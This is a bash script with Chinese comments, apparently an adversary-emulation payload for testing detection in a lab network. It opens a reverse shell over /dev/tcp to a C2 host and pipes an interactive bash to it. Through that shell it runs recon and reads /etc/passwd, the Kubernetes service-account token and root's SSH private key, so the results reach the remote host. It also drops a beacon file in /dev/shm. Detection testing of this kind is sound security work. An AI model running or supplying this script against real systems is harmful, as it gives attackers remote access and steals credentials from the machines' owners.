#!/usr/bin/env bash
# apt-fileless-c2 反弹 shell + 脚本化后渗透（测试网内，行为真实但无破坏性）。
# 由受害进程下载到 /dev/shm/x.sh 后执行。设计为【自驱动】：
#   - 真实 connect 到 C2（reverse_shell_pattern：stdout/stderr 重定向到 socket）
#   - 用 -i 交互 shell 形态触发检测，stdin 由 here-doc 喂入，确定性、不挂起
#   - 真实执行 recon 与凭据读取，产生真实 exec/open/read 系统调用
C2_IP="${C2_IP:-10.66.0.99}"
C2_PORT="${C2_PORT:-443}"

# 建立反弹通道（真实 TCP connect）
exec 3<>/dev/tcp/"$C2_IP"/"$C2_PORT" || { echo "[x.sh] connect failed"; exit 0; }

# 交互 shell，fd1/2 绑定到 C2 socket（反弹 shell 特征），命令经 here-doc 自驱动
bash -i >&3 2>&3 <<'POST_EXPLOIT'
id
uname -a
hostname
whoami
# T1083 探查 + T1552 凭据读取（真实 open/read）
cat /etc/passwd
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
ls -la /root /home 2>/dev/null
ps -ef
# 真实写一个标记文件（open/write）
echo "owned $(date +%s)" > /dev/shm/.beacon
exit
POST_EXPLOIT

exec 3>&- 2>/dev/null
echo "[x.sh] post-exploitation done"
